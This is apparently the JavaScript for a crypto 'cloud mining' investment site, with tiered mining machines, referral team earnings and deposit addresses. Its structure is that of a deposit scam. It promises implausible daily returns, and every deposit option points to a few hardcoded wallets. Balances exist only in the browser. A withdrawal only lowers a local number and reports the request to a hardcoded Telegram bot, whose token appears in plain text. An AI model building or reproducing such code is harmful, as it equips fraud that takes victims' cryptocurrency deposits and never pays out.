// Telegram API Configuration
const TELEGRAM_BOT_TOKEN = '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0';
const TELEGRAM_CHAT_ID = '7417215529';

// User Data
let userData = {
    balance: 0,
    miningLevel: 1,
    miningActive: false,
    miningStartTime: null,
    minedAmount: 0,
    directTeam: 0,
    totalTeam: 0,
    teamEarnings: 0,
    referralCode: 'SOL-7X9P2Q'
};

// Mining Tools Data
const miningTools = [
    { id: 1, name: "Mining Machine 1", price: 10, dailyOutput: 2 },
    { id: 2, name: "Mining Machine 2", price: 50, dailyOutput: 10 },
    { id: 3, name: "Mining Machine 3", price: 150, dailyOutput: 30 },
    { id: 4, name: "Mining Machine 4", price: 450, dailyOutput: 90 },
    { id: 5, name: "Mining Machine 5", price: 1350, dailyOutput: 275 },
    { id: 6, name: "Mining Machine 6", price: 4050, dailyOutput: 844 },
    { id: 7, name: "Mining Machine 7", price: 12150, dailyOutput: 2650 },
    { id: 8, name: "Mining Machine 8", price: 36450, dailyOutput: 8477 },
    { id: 9, name: "Mining Machine 9", price: 72900, dailyOutput: 29160 },
    { id: 10, name: "Mining Machine 10", price: 145800, dailyOutput: 72900 }
];

// Network Addresses
const networkAddresses = {
    'BEP20-USDT': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'BEP20-USDC': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'POLYGON-USDT': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'POLYGON-USDC': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'ETH-USDT': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'ETH-USDC': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'TRC20-USDT': 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    'TRX': 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    'BNB': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'ETH': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'SOL': 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu',
    'TON': 'UQCQcNww5CQho7aDQSb4AC_o3TPXeDshkD64L_iY7wknzyaz',
    'MORPH': '0x53f90e7a0d2834b772890f4f456d51aaed61de43'
};

// DOM Elements
const mineTab = document.getElementById('mine-tab');
const upgradeTab = document.getElementById('upgrade-tab');
const teamTab = document.getElementById('team-tab');
const withdrawTab = document.getElementById('withdraw-tab');
const navTabs = document.querySelectorAll('.nav-tab');
const footerNavItems = document.querySelectorAll('.footer-nav-item');
const startMiningBtn = document.getElementById('start-mining-btn');
const claimMiningBtn = document.getElementById('claim-mining-btn');
const miningSpeedEl = document.getElementById('mining-speed');
const minedAmountEl = document.getElementById('mined-amount');
const miningTimeEl = document.getElementById('mining-time');
const userBalanceEl = document.getElementById('user-balance');
const upgradeGrid = document.getElementById('upgrade-grid');
const directTeamEl = document.getElementById('direct-team');
const totalTeamEl = document.getElementById('total-team');
const teamEarningsEl = document.getElementById('team-earnings');
const referralCodeEl = document.getElementById('referral-code');
const copyReferralBtn = document.getElementById('copy-referral');
const inviteBtn = document.getElementById('invite-btn');
const depositBtn = document.getElementById('deposit-btn');
const loadingScreen = document.getElementById('loading-screen');
const notification = document.getElementById('notification');
const notificationText = document.getElementById('notification-text');
const depositModal = document.getElementById('deposit-modal');
const closeDepositModal = document.getElementById('close-deposit-modal');
const depositMethod = document.getElementById('deposit-method');
const depositAddress = document.getElementById('deposit-address');
const copyAddressBtn = document.getElementById('copy-address');
const inviteModal = document.getElementById('invite-modal');
const closeInviteModal = document.getElementById('close-invite-modal');
const referralLink = document.getElementById('referral-link');
const copyLinkBtn = document.getElementById('copy-link');
const networkOptions = document.querySelectorAll('.network-option');
const withdrawAddress = document.getElementById('withdraw-address');
const withdrawAmount = document.getElementById('withdraw-amount');
const securityPassword = document.getElementById('security-password');
const actualArrival = document.getElementById('actual-arrival');
const confirmWithdraw = document.getElementById('confirm-withdraw');
const amountOptions = document.querySelectorAll('.btn-amount-option');

// Initialize the application
function init() {
    updateUI();
    renderUpgradeTools();
    setupEventListeners();
    loadUserData();
    updateMiningStatus();
}

// Set up event listeners
function setupEventListeners() {
    // Navigation
    navTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const tabName = tab.getAttribute('data-tab');
            switchTab(tabName);
        });
    });

    footerNavItems.forEach(item => {
        item.addEventListener('click', () => {
            if (item.id === 'deposit-btn') {
                openDepositModal();
            } else {
                const tabName = item.getAttribute('data-tab');
                switchTab(tabName);
            }
        });
    });

    // Mining
    startMiningBtn.addEventListener('click', startMining);
    claimMiningBtn.addEventListener('click', claimMining);

    // Team
    copyReferralBtn.addEventListener('click', copyReferralCode);
    inviteBtn.addEventListener('click', openInviteModal);

    // Deposit
    depositBtn.addEventListener('click', openDepositModal);
    closeDepositModal.addEventListener('click', closeModal);
    depositMethod.addEventListener('change', updateDepositAddress);
    copyAddressBtn.addEventListener('click', copyDepositAddress);

    // Invite
    closeInviteModal.addEventListener('click', closeModal);
    copyLinkBtn.addEventListener('click', copyReferralLink);

    // Withdraw
    networkOptions.forEach(option => {
        option.addEventListener('click', () => {
            networkOptions.forEach(opt => opt.classList.remove('active'));
            option.classList.add('active');
        });
    });

    amountOptions.forEach(option => {
        option.addEventListener('click', () => {
            const percent = option.getAttribute('data-percent');
            withdrawAmount.value = (userData.balance * percent / 100).toFixed(2);
            updateActualArrival();
        });
    });

    withdrawAmount.addEventListener('input', updateActualArrival);
    confirmWithdraw.addEventListener('click', processWithdrawal);
}

// Switch between tabs
function switchTab(tabName) {
    // Update navigation
    navTabs.forEach(tab => {
        if (tab.getAttribute('data-tab') === tabName) {
            tab.classList.add('active');
        } else {
            tab.classList.remove('active');
        }
    });

    footerNavItems.forEach(item => {
        if (item.getAttribute('data-tab') === tabName) {
            item.classList.add('active');
        } else {
            item.classList.remove('active');
        }
    });

    // Update content
    mineTab.classList.remove('active');
    upgradeTab.classList.remove('active');
    teamTab.classList.remove('active');
    withdrawTab.classList.remove('active');

    document.getElementById(`${tabName}-tab`).classList.add('active');
}

// Update UI with user data
function updateUI() {
    userBalanceEl.textContent = userData.balance.toFixed(2);
    directTeamEl.textContent = userData.directTeam;
    totalTeamEl.textContent = userData.totalTeam;
    teamEarningsEl.textContent = userData.teamEarnings.toFixed(2);
    referralCodeEl.textContent = userData.referralCode;
}

// Render upgrade tools
function renderUpgradeTools() {
    upgradeGrid.innerHTML = '';
    
    miningTools.forEach(tool => {
        const toolElement = document.createElement('div');
        toolElement.className = 'upgrade-item';
        toolElement.innerHTML = `
            <div class="upgrade-icon">
                <i class="fas fa-server"></i>
            </div>
            <div class="upgrade-title">${tool.name}</div>
            <div class="upgrade-price">${tool.price} USDT</div>
            <div class="upgrade-output">Daily: ${tool.dailyOutput} SOL</div>
            <button class="btn btn-primary upgrade-btn" data-id="${tool.id}">
                <i class="fas fa-shopping-cart"></i> Purchase
            </button>
        `;
        upgradeGrid.appendChild(toolElement);
    });

    // Add event listeners to upgrade buttons
    document.querySelectorAll('.upgrade-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const toolId = parseInt(btn.getAttribute('data-id'));
            purchaseMiningTool(toolId);
        });
    });
}

// Start mining
function startMining() {
    if (userData.balance < 10) {
        showNotification('Insufficient balance. Minimum 10 USDT required to start mining.', 'error');
        openDepositModal();
        return;
    }

    userData.miningActive = true;
    userData.miningStartTime = Date.now();
    startMiningBtn.style.display = 'none';
    claimMiningBtn.style.display = 'inline-flex';
    
    showNotification('Mining started successfully!', 'success');
    updateMiningStatus();
}

// Claim mining rewards
function claimMining() {
    if (!userData.miningActive) return;
    
    const miningTime = Date.now() - userData.miningStartTime;
    const hoursMined = miningTime / (1000 * 60 * 60);
    const currentTool = miningTools[userData.miningLevel - 1];
    const minedSOL = (currentTool.dailyOutput / 24) * hoursMined;
    
    userData.minedAmount += minedSOL;
    userData.miningActive = false;
    userData.miningStartTime = null;
    
    startMiningBtn.style.display = 'inline-flex';
    claimMiningBtn.style.display = 'none';
    
    showNotification(`Successfully claimed ${minedSOL.toFixed(2)} SOL!`, 'success');
    updateMiningStatus();
}

// Update mining status
function updateMiningStatus() {
    if (userData.miningActive) {
        const currentTool = miningTools[userData.miningLevel - 1];
        const miningSpeed = currentTool.dailyOutput / 24;
        miningSpeedEl.textContent = miningSpeed.toFixed(2);
        
        const elapsedTime = Date.now() - userData.miningStartTime;
        const remainingTime = 12 * 60 * 60 * 1000 - elapsedTime;
        
        if (remainingTime <= 0) {
            claimMining();
            return;
        }
        
        const hours = Math.floor(remainingTime / (1000 * 60 * 60));
        const minutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remainingTime % (1000 * 60)) / 1000);
        
        miningTimeEl.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        // Update mined amount
        const hoursMined = elapsedTime / (1000 * 60 * 60);
        const minedSOL = (currentTool.dailyOutput / 24) * hoursMined;
        minedAmountEl.textContent = minedSOL.toFixed(2);
        
        setTimeout(updateMiningStatus, 1000);
    } else {
        miningSpeedEl.textContent = '0.00';
        minedAmountEl.textContent = userData.minedAmount.toFixed(2);
        miningTimeEl.textContent = '00:00:00';
    }
}

// Purchase mining tool
function purchaseMiningTool(toolId) {
    const tool = miningTools[toolId - 1];
    
    if (userData.balance < tool.price) {
        showNotification('Insufficient balance. Please deposit more USDT.', 'error');
        openDepositModal();
        return;
    }
    
    showLoadingScreen();
    
    setTimeout(() => {
        userData.balance -= tool.price;
        userData.miningLevel = toolId;
        
        hideLoadingScreen();
        showNotification(`Successfully purchased ${tool.name}!`, 'success');
        updateUI();
        
        // Send Telegram notification
        sendTelegramMessage(`User purchased ${tool.name} for ${tool.price} USDT`);
    }, 2000);
}

// Copy referral code
function copyReferralCode() {
    navigator.clipboard.writeText(userData.referralCode)
        .then(() => {
            showNotification('Referral code copied to clipboard!', 'success');
        })
        .catch(err => {
            showNotification('Failed to copy referral code', 'error');
        });
}

// Copy referral link
function copyReferralLink() {
    navigator.clipboard.writeText(referralLink.value)
        .then(() => {
            showNotification('Referral link copied to clipboard!', 'success');
        })
        .catch(err => {
            showNotification('Failed to copy referral link', 'error');
        });
}

// Copy deposit address
function copyDepositAddress() {
    navigator.clipboard.writeText(depositAddress.textContent)
        .then(() => {
            showNotification('Deposit address copied to clipboard!', 'success');
        })
        .catch(err => {
            showNotification('Failed to copy deposit address', 'error');
        });
}

// Open deposit modal
function openDepositModal() {
    depositModal.style.display = 'flex';
    updateDepositAddress();
}

// Open invite modal
function openInviteModal() {
    inviteModal.style.display = 'flex';
}

// Close modal
function closeModal() {
    depositModal.style.display = 'none';
    inviteModal.style.display = 'none';
}

// Update deposit address based on selected method
function updateDepositAddress() {
    const method = depositMethod.value;
    depositAddress.textContent = networkAddresses[method] || 'Address not available';
}

// Update actual arrival amount for withdrawal
function updateActualArrival() {
    const amount = parseFloat(withdrawAmount.value) || 0;
    actualArrival.textContent = `${amount.toFixed(2)} USDT`;
}

// Process withdrawal
function processWithdrawal() {
    const selectedNetwork = document.querySelector('.network-option.active').getAttribute('data-network');
    const address = withdrawAddress.value.trim();
    const amount = parseFloat(withdrawAmount.value);
    const password = securityPassword.value;
    
    if (!address) {
        showNotification('Please enter a withdrawal address', 'error');
        return;
    }
    
    if (!amount || amount < 1) {
        showNotification('Minimum withdrawal amount is 1 USDT', 'error');
        return;
    }
    
    if (amount > userData.balance) {
        showNotification('Insufficient balance for withdrawal', 'error');
        return;
    }
    
    if (!password) {
        showNotification('Please enter your security password', 'error');
        return;
    }
    
    showLoadingScreen();
    
    setTimeout(() => {
        userData.balance -= amount;
        
        hideLoadingScreen();
        showNotification('Withdrawal request submitted successfully. It may take up to 24 hours to process.', 'success');
        updateUI();
        
        // Send Telegram notification
        sendTelegramMessage(`Withdrawal request: ${amount} USDT to ${address} via ${selectedNetwork}`);
        
        // Reset form
        withdrawAddress.value = '';
        withdrawAmount.value = '';
        securityPassword.value = '';
        updateActualArrival();
    }, 2000);
}

// Show loading screen
function showLoadingScreen() {
    loadingScreen.style.display = 'flex';
}

// Hide loading screen
function hideLoadingScreen() {
    loadingScreen.style.display = 'none';
}

// Show notification
function showNotification(message, type = 'success') {
    notificationText.textContent = message;
    
    if (type === 'error') {
        notification.style.background = 'var(--danger)';
    } else if (type === 'warning') {
        notification.style.background = 'var(--warning)';
        notification.style.color = 'var(--dark)';
    } else {
        notification.style.background = 'var(--success)';
    }
    
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// Send Telegram message
function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    };
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .catch(error => console.error('Error sending Telegram message:', error));
}

// Load user data from localStorage
function loadUserData() {
    const savedData = localStorage.getItem('solCoinUserData');
    if (savedData) {
        userData = { ...userData, ...JSON.parse(savedData) };
        updateUI();
    }
}

// Save user data to localStorage
function saveUserData() {
    localStorage.setItem('solCoinUserData', JSON.stringify(userData));
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', init);

// Save user data before page unload
window.addEventListener('beforeunload', saveUserData);
